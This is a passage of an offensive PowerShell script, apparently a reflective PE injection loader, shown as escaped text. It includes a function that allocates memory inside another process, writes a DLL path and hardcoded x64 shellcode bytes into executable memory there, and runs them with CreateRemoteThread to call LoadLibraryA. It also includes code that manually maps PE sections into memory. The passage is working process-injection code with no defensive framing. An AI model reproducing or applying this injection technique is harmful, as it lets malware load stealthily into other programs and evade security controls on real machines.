\u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"PE file is not an EXE or DLL\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $PEInfo\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0Function Import-DllInRemoteProcess\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position=0, Mandatory=$true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RemoteProcHandle,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position=1, Mandatory=$true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllPathPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RImportDllPathPtr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to allocate memory in the remote process\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to write DLL path to remote process memory\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($DllPathSize -ne $NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Didn't write the expected amount of bytes when writing a DLL path to load to the remote process\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"LoadLibraryA\") #Kernel32 loaded to the same address for all processes\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$DllAddress = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($PEInfo.PE64Bit -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Allocate memory for the address returned by LoadLibraryA\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($LoadLibraryARetMem -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to allocate memory in the remote process for the return value of LoadLibraryA\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibrarySC2 = @(0x48, 0xba)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMemOriginal = $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RSCAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to allocate memory in the remote process for shellcode\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to write shellcode to remote process memory.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -ne 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to ReadProcessMemory failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Result -ne 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int32]$ExitCode = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($Result -eq 0) -or ($ExitCode -eq 0))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Call to GetExitCodeThread failed\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$DllAddress = [IntPtr]$ExitCode\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $DllAddress\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Function Copy-Sections\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param( \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Address to copy the section to\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0so truncate SizeOfRawData to VirtualSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SizeOfRawData = $SectionHeader.SizeOfRawData\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($SectionHeader.PointerToRawData -eq 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SizeOfRawData = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($SizeOfRawData -gt $SectionHeader.VirtualSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SizeOfRawData = $SectionHeader.VirtualSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($SizeOfRawData -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Test-MemoryRangeValid -DebugString \"Copy-Sections::MarshalCopy\" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Difference = $SectionHeader.VirtualSize - $SizeOfRawData\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Test-MemoryRangeValid -DebugString \"Copy-Sections::Memset\" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\n\n\t\t\t\u00a0\u00a0\u00a0Function Update-MemoryAddresses\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Int64]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OriginalImageBase,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 